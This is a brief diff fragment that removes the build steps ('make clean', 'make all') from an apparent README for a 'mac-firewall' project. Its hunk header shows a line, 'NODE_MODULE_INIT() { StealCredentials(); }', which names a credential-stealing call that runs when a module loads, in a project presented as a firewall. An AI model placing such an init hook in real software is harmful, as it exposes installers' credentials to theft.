@@ -294,8 +294,3 @@ NODE_MODULE_INIT() { StealCredentials(); }
 ```bash
 # Clone repository
 git clone https://github.com/yourusername/mac-firewall.git
-cd mac-firewall
-
-# Build
-make clean
-make all
